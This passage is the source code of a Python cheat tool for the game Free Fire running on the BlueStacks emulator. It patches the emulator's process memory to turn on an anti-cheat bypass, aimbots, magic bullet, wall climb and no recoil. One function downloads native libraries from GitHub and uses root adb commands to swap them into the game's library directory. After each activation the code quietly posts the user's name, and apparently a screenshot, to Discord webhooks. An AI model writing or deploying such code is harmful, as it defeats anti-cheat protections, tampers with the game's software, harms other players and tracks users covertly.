            write_bytes(proc.process_handle, addr, bytes.fromhex("00 51 88 E5 00 40"), 6) 
        for addr in value2:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00 01 87 E5 00 70 94 E5"), 8)               

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        ss_aksi(WEBHOOK_URL)  

def LOGINPAGE32GLOBAL():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return LOGOGARENA()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading... (STEP 1-2)")
            value1 = pattern_scan_all(proc.process_handle, mkp("47 61 6D 65 56 61 72"), return_multiple = True) #
            value2 = pattern_scan_all(proc.process_handle, mkp("00 48 2D E9 0D B0 A0 E1 90 D0 4D E2"), return_multiple = True)
            value3 = pattern_scan_all(proc.process_handle, mkp("33 33 13 40 00 00 C0 3F 00 00 80 3F"), return_multiple = True)  
            print("\033[31m[>]\033[0m Step 1 Successfully!")
            value4 = pattern_scan_all(proc.process_handle, mkp("3C 51 88 E5 00 40"), return_multiple = True) #
            value5 = pattern_scan_all(proc.process_handle, mkp("28 01 87 E5 00 70 94 E5"), return_multiple = True)             
            value6 = pattern_scan_all(proc.process_handle, mkp("F0 B5 03 AF 2D E9 00 0F 97 B0 04 46 00"), return_multiple = True) #
            print("\033[31m[>]\033[0m Step 2 Successfully!")
            #os.system('cls')
    except:
        input("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3 or value4 or value5 or value6:
        for addr in value1:
            write_bytes(proc.process_handle, addr, bytes.fromhex("47 61 6D 65 56 40 72"), 7) 
        for addr in value2:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00 00 A0 E3 1E FF 2F E1"), 8)
        for addr in value3:
            write_bytes(proc.process_handle, addr, bytes.fromhex("FF B1 FF FF 01 01 FF 3F 0F 0F 99 5F"), 12)
        for addr in value4:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1) 
        for addr in value5:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)           
        for addr in value6:
            write_bytes(proc.process_handle, addr, bytes.fromhex("00 20 70 47"), 4)                

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m") 
        teks = f"""
    **ACTIVITY INFORMATION**
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    [ > ] **Game:** Free Fire
    [ > ] **Message :** **{keyauthapp.user_data.username}** has Select **BYPASS EMULATOR GLOBAL**
    [ > ] **Status:** Sucessfully Activated!
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ||@everyone ||"""
        kirim_ke_discord(webhook_url2, teks)   
        ss_aksi(WEBHOOK_URL)
            
def LOGINPAGE32():
    os.system('cls')
    print("""===== [ READ THIS BEFORE ACTIVATED ] =====
English: Did you enable the anti cheat feature before using the bypass? (y/n)
Indonesia: Apakah anda sudah mengaktifkan fitur anti cheat sebelum memakai bypass? (y/n)

Note:
If you select n, it will automatically activate the anti-cheat feature!
If you select y, it will automatically activate the bypass feature!

Catatan:
Jika Anda memilih n, maka secara otomatis akan mengaktifkan fitur anti-cheat!
Jika Anda memilih y, maka secara otomatis akan mengaktifkan fitur bypass!

Description:
You must enable the anti cheat feature first, before using the bypass (to protect your account from being banned)!

Keterangan:
Anda Wajib Mengaktifkan fitur anti cheat terlebih dahulu, sebelum memakai bypass (untuk melindungi akun anda dari banned)!
""")
    menu = input("Type (y/n): ")
    if menu == 'n':
        ANTICHEATBP()
        LOGINPAGE32()
    elif menu == 'y':
        try:
            proc = Pymem("HD-Player")
        except pymem.exception.ProcessNotFound:
            repy=print("[>] BlueStacks is not running!")
            if repy==input("[>] Press Enter to Continue..."):
                return LOGINPAGE32()
            else:
                return
                
        try:
            if proc:
                print("\033[31m[>]\033[0m Loading... (Bypassing)")
                value1 = pattern_scan_all(proc.process_handle, mkp("3C 51 88 E5 00 70 94 E5 CC 50 96 E5 00 00 57 E3"), return_multiple = True) #
                value2 = pattern_scan_all(proc.process_handle, mkp("28 01 87 E5 00 70 94 E5 01 10 9F E7 00 00 91 E5"), return_multiple = True)             
                value3 = pattern_scan_all(proc.process_handle, mkp("F0 B5 03 AF 2D E9 00 0F 97 B0 04 46 00 F0 BF F8 48 4A 00 28 4B F6 91 41 7A 44 C4 F2 4E"), return_multiple = True) #
                
                #os.system('cls')
        except:
            input("[>] Failed to activate please restart your BlueStacks!")
            return

        if value1 or value2 or value3:
            for addr in value1:
                write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1) 
            for addr in value2:
                write_bytes(proc.process_handle, addr, bytes.fromhex("00"), 1)           
            for addr in value3:
                write_bytes(proc.process_handle, addr, bytes.fromhex("00 20 70 47"), 4) 

                                                
            print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
            teks = f"""
    **ACTIVITY INFORMATION**
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    [ > ] **Game:** Free Fire
    [ > ] **Message :** **{keyauthapp.user_data.username}** has Select **BYPASS EMULATOR INDONESIA**
    [ > ] **Status:** Sucessfully Activated!
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ||@everyone ||"""
            kirim_ke_discord(webhook_url2, teks)   
            ss_aksi(WEBHOOK_URL)


def check_file_exists(file_path):
    if not os.path.exists(file_path):
        os.system("cls")
        print("""


 [[ FOLDER BLUESTACKS 32 BIT ]]
BlueStacks_msi2 = Bluestacks MSI 4
BlueStacks_msi5 = Bluestacks MSI 5
Bluestacks      = Bluestacks 4
BlueStacks_nxt  = Bluestakcs 5

""")
        print(" [[ ENGLISH ]]")
        print("Please move BOYZGAMES PANEL.exe in same Directory with your Bluestacks!")
        print("example C:\Program Files\BlueStacks_msi2 is for MSI 4")
        print("So move BOYZGAMES Panel.exe to C:\Program Files\BlueStacks_msi2\ if you use MSI 4")
        print("You cann see Bluestacks installed path here: C:\Program Files\ \n\n")
        print(" [[ INDONESIA ]]")
        print("Mohon Pindahkan BOYZGAMES PANEL.exe Ke directory Bluestacks kamu!")
        print("Contoh C:\Program Files\BlueStacks_msi2 adalah directory MSI 4")
        print("Jadi Pindahkan BOYZGAMES Panel.exe ke C:\Program Files\BlueStacks_msi2\ Jika kamu menggunakan MSI 4")
        print("Kamu bisa Melihat Bluestacks path yang terinstall di: C:\Program Files\ \n\n")
        input("press Enter to Continue...")
        os._exit(1)

def check_process_running(process_name):
    process_list = subprocess.run(['tasklist'], capture_output=True, text=True).stdout
    if process_name not in process_list:
        print(f"Bluestacks is not running. Please run Bluestacks first.")
        input("press Enter to Continue...")
        os._exit(1)

def check_url_status(url):
    try:
        response = requests.head(url, timeout=10)
        response.raise_for_status()  # Raises HTTPError for bad responses
        os.system("cls")
        print(f"[>] Modified Emulator, Please Wait...")
    except requests.exceptions.HTTPError:
        print(f"HTTP Error")
        os._exit(1)
    except requests.exceptions.ConnectionError:
        print(f"Error Connecting")
        os._exit(1)
    except requests.exceptions.Timeout:
        print(f"Timeout Error")
        os._exit(1)
    except requests.exceptions.RequestException:
        print(f"An error occurred")
        os._exit(1)

def BYPASS_PRIME():
    print("Loading...")

    # URL file yang akan diunduh
    url_libmain = "https://github.com/BoyzGames/FAK/raw/main/libmain.so"
    url_libxg = "https://github.com/BoyzGames/FAK/raw/main/liboyzgames.so"

    # Nama file sementara
    temp_libmain = "C:\\Windows\\libmain.so"
    temp_libxg = "C:\\Windows\\libxg.so"

    # Lokasi tempat menyimpan file sementara
    temp_directory = "C:\\Windows\\"

    # Pastikan direktori tempat sementara ada
    os.makedirs(temp_directory, exist_ok=True)

    # Check if HD-Adb.exe exists in the same directory
    check_file_exists("HD-Adb.exe")

    # Check if HD-Player.exe is running
    check_process_running("HD-Player.exe")

    # Check the status of the URLs
    check_url_status(url_libmain)
    check_url_status(url_libxg)

    # Unduh file libmain.so
    response_libmain = requests.get(url_libmain)
    with open(os.path.join(temp_directory, temp_libmain), "wb") as libmain_file:
        libmain_file.write(response_libmain.content)

    # Unduh file libxg.so
    response_libxg = requests.get(url_libxg)
    with open(os.path.join(temp_directory, temp_libxg), "wb") as libxg_file:
        libxg_file.write(response_libxg.content)

    # Inisialisasi perintah ADB
    adb_commands = [
        "HD-Adb.exe kill-server",
        "HD-Adb.exe connect 127.0.0.1:5555",
        "HD-Adb.exe -e -s 127.0.0.1:5555 shell am force-stop com.dts.freefireth",
        
        f'HD-Adb.exe -e -s 127.0.0.1:5555 push "{os.path.join(temp_directory, temp_libmain)}" /sdcard/com.garena.msdk/',
        f'HD-Adb.exe -e -s 127.0.0.1:5555 push "{os.path.join(temp_directory, temp_libxg)}" /sdcard/com.garena.msdk/',
        
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'mv /data/app/com.dts.freefireth-1/lib/arm/libmain.so /data/app/com.dts.freefireth-1/lib/arm/libBOYZGAMES.so'\"",
        
        f"HD-Adb.exe -d -e -s 127.0.0.1:5555 shell \"su -c 'mv /sdcard/com.garena.msdk/libmain.so /data/app/com.dts.freefireth-1/lib/arm/'\"",
        f"HD-Adb.exe -d -e -s 127.0.0.1:5555 shell \"su -c 'mv /sdcard/com.garena.msdk/libxg.so /data/app/com.dts.freefireth-1/lib/arm/'\"",
        
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chmod 777 /data/app/com.dts.freefireth-1/lib/arm/libmain.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chown 0:9997 /data/app/com.dts.freefireth-1/lib/arm/libmain.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chmod 777 /data/app/com.dts.freefireth-1/lib/arm/libxg.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chown 0:9997 /data/app/com.dts.freefireth-1/lib/arm/libxg.so'\"",
        
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell am start -n com.dts.freefireth/com.dts.freefireth.FFMainActivity",
        "HD-Adb.exe -e -s 127.0.0.1:5555 shell sleep 7",
        
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chmod 755 /data/app/com.dts.freefireth-1/lib/arm/libmain.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chown 1000:1000 /data/app/com.dts.freefireth-1/lib/arm/libmain.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chmod 755 /data/app/com.dts.freefireth-1/lib/arm/libxg.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'chown 1000:1000 /data/app/com.dts.freefireth-1/lib/arm/libxg.so'\"",
        "HD-Adb.exe -e -s 127.0.0.1:5555 shell sleep 7",
        
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'rm /data/app/com.dts.freefireth-1/lib/arm/libxg.so'\"",
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'rm /data/app/com.dts.freefireth-1/lib/arm/limain.so'\"",
        
        f"HD-Adb.exe -e -s 127.0.0.1:5555 shell \"su -c 'mv /data/app/com.dts.freefireth-1/lib/arm/libBOYZGAMES.so /data/app/com.dts.freefireth-1/lib/arm/libmain.so'\""
    ]

    # Jalankan perintah ADB
    for command in adb_commands:
        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Hapus file sementara setelah selesai
    os.remove(os.path.join(temp_directory, temp_libmain))
    os.remove(os.path.join(temp_directory, temp_libxg))

    print("[>] Bypass Sucessfully Activated!")
    teks = f"""
    **ACTIVITY INFORMATION**
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    [ > ] **Game:** Free Fire
    [ > ] **Message :** **{keyauthapp.user_data.username}** has Select **BYPASS EMULATOR PRIME**
    [ > ] **Status:** Sucessfully Activated!
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    ||@everyone ||"""
    kirim_ke_discord(webhook_url2, teks)   
    ss_aksi(WEBHOOK_URL)
    input("Press Enter to Continue...")
    
def MAGICBRUTAL():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return MAGICBRUTAL()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("23 AA A6 B8 46 0A CD 70"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("47 7B 5A BD AE 57 66 BB 5C 1F 48 BA 1B C0 CF 3B 9C FB 28 3D A2 B1 17 BD E4 99 7F 3F 04 00 80 3F 00 00 80 3F FE FF 7F 3F"), return_multiple = True)
            value3 = pattern_scan_all(proc.process_handle, mkp("4C 7B 5A BD 0A 57 66 BB 1E 21 48 BA 2A C2 CF 3B 96 FB 28 3D E8 B1 17 BD E3 99 7F 3F 04 00 80 3F 01 00 80 3F FC FF 7F 3F"), return_multiple = True)
            value4 = pattern_scan_all(proc.process_handle, mkp("10 00 00 00 62 00 6F 00 6E 00 65 00 5F 00 4C 00 65 00 66 00 74 00 5F 00 57 00 65 00 61 00 70 00 6F 00 6E 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3 or value4:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("23 AA A6 B8 B2 F7 1F A4"))  
        for addr in value2:
            replace(proc, addr, bytes.fromhex("8D 07 74 3F AE 57 66 BB 5C 1F 48 BA 1B C0 CF 3B 9C FB 28 3D A2 B1 17 BD E4 99 7F 3F 00 00 60 41 00 00 60 41 00 00 60 41")) 
        for addr in value3:
            replace(proc, addr, bytes.fromhex("1B 0E 74 3F AE 57 66 BB 5C 1F 48 BA 1B C0 CF 3B 9C FB 28 3D A2 B1 17 BD E4 99 7F 3F 00 00 60 41 00 00 60 41 00 00 60 41")) 
        for addr in value4:
            replace(proc, addr, bytes.fromhex("10 00 00 00 62 00 6F 00 6E 00 65 00 5F 00 53 00 70 00 69 00 6E 00 65 00 00 00 00 00 00 00 00 00 00 00 00 00"))  

                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **MAGIC BULLET (BRUTAL)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def MAGICSAFE():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return MAGICSAFE()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("18 D0 8D E2 70 80 BD E8 D4 2A 8C 00 AC C5 27 37 30 48 2D E9 01 40 A0 E1 20 10 9F E5"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("18 D0 8D E2 70 80 BD E8 D4 2A 8C 00 D7 A3 30 3F 30 48 2D E9 01 40 A0 E1 20 10 9F E5"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **MAGIC BULLET (SAFE)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def WallClimbON():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return WallClimbON()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("F3 04 35 3F 0A D7 A3 3D 9A 99 99 3E"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("F3 04 35 3F 0A D7 A3 3D 00 C0 79 44"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **WALL CLIMB (ON)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def WallClimbOFF():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return WallClimbOFF()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("F3 04 35 3F 0A D7 A3 3D 00 C0 79 44"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("F3 04 35 3F 0A D7 A3 3D 9A 99 99 3E"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **WALL CLIMB (OFF)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')           

def ipadON():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ipadON()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("DB 0F 49 40 10 2A 00 EE 00 10 80 E5 10 3A 01 EE 14 10 80 E5 00 2A 30 EE 00 10 00 E3 41 3A 30 EE 80 1F 4B E3 01 0A 30 EE"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("00 00 A0 40"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **I-PAD VIEW (ON)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')
        
def ipadOFF():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ipadOFF()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 A0 40 10 2A 00 EE 00 10 80 E5 10 3A 01 EE 14 10 80 E5 00 2A 30 EE 00 10 00 E3 41 3A 30 EE 80 1F 4B E3 01 0A 30 EE"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("DB 0F 49 40"))  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **I-PAD VIEW (OFF)**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def AIMFOV():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AIMFOV()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("00 00 20 42 00 00 40 40 00 00 70 42"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("00 00 00 00 00 00 C0 3F 00 00 20 41"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("00 00 20 42 E0 B1 FF FF 00 00 70 42"))
        for addr in value2:
            replace(proc, addr, bytes.fromhex("00 00 00 00 00 00 70 41 00 00 20 41"))        
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIM FOV**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def AIMBOT2X():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AIMBOT2X()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("A0 42 00 00 C0 3F 33 33 13 40 00 00 C0 3F 00 00 80 3F"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("A0 42 00 00 C0 3F E0 B1 FF FF 00 00 C0 3F 00 00 00 3F"))     
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIMBOT SCOPE 2X**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def AIMBOT4X():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return AIMBOT4X()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("41 00 00 48 42 00 00 00 3F 33 33 13 40 66 66 A6 3F 00 00 80 3F 01"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("41 00 00 48 42 00 00 00 3F E0 B1 FF FF 66 66 A6 3F 00 00 80 3F 01"))     
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIMBOT SCOPE 4X**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def SNAIMBOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return SNAIMBOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("E0 B1 FF FF E0 B1 FF FF E0 B1 FF FF E0 B1 FF FF E0 B1 FF FF"))     
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIMBOT SNIPER SCOPE**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def ALLSCOPEAIMBOT():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return ALLSCOPEAIMBOT()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("41 00 00 48 42 00 00 00 3F 33 33 13 40 66 66 A6 3F 00 00 80 3F 01"), return_multiple = True)
            value2 = pattern_scan_all(proc.process_handle, mkp("A0 42 00 00 C0 3F 33 33 13 40 00 00 C0 3F 00 00 80 3F"), return_multiple = True)
            value3 = pattern_scan_all(proc.process_handle, mkp("CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 00 00"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1 or value2 or value3:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("41 00 00 48 42 00 00 00 3F E0 B1 FF FF 66 66 A6 3F 00 00 80 3F 01"))
        for addr in value2:
            replace(proc, addr, bytes.fromhex("A0 42 00 00 C0 3F E0 B1 FF FF 00 00 C0 3F 00 00 00 3F"))     
        for addr in value3:
            replace(proc, addr, bytes.fromhex("E0 B1 FF FF E0 B1 FF FF E0 B1 FF FF E0 B1 FF FF E0 B1 FF FF"))                  
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
        ss_aksi(WEBHOOK_URL)
        teks = f"""
**ACTIVITY INFORMATION**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[ > ] **Game:** Free Fire
[ > ] **Message :** **{keyauthapp.user_data.username}** has Select **AIMBOT ALL SCOPE**
[ > ] **Status:** Sucessfully Activated!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        kirim_ke_discord(webhook_url2, teks)  
        input('press ENTER button to Continue...')

def recoilON():
    try:
        proc = Pymem("HD-Player")
    except pymem.exception.ProcessNotFound:
        repy=print("[>] BlueStacks is not running!")
        if repy==input("[>] Press Enter to Continue..."):
            return recoilON()
        else:
            return
            
    try:
        if proc:
            print("\033[31m[>]\033[0m Loading...")
            value1 = pattern_scan_all(proc.process_handle, mkp("10 8C BD E8 00 00 7A 44 F0 48 2D E9"), return_multiple = True)
            #os.system('cls')
    except:
        print("[>] Failed to activate please restart your BlueStacks!")
        return

    if value1:
        for addr in value1:
            replace(proc, addr, bytes.fromhex("10 8C BD E8 00 00 00 00 F0 48 2D E9"))     
                                               
        print("\033[31m[>] \033[92mSuccessfully Activated!\033[0m")
